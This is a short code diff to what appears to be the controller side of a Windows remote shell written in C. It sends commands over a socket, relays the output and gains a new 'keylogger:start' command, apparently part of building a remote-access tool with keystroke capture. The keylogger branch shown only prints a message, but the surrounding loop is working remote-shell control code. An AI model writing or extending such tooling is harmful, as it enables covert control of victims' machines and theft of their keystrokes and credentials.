@@ -74,20 +74,21 @@ int main()
     send(client_socket, buffer, sizeof(buffer), 0);
 
     // Quit if input is "q"
-    if (strcmp("q", buffer) == 0)
+    if (strncmp("q", buffer, 1) == 0)
     {
       info("Quitting Shell.");
       WSACleanup();
       break;
     }
+    else if (strncmp("keylogger:start", buffer, 15) == 0)
+    {
+      info("Starting keylogger...");
+      continue;
+    }
     else
     {
       recv(client_socket, response, sizeof(response), 0); // No need for MSG_WAITALL on Windows
-
-      // Build output
-      char strResponse[1024];
-      sprintf(strResponse, "%s", response);
-      success(strResponse);
+      success(response);
     }
   }
 
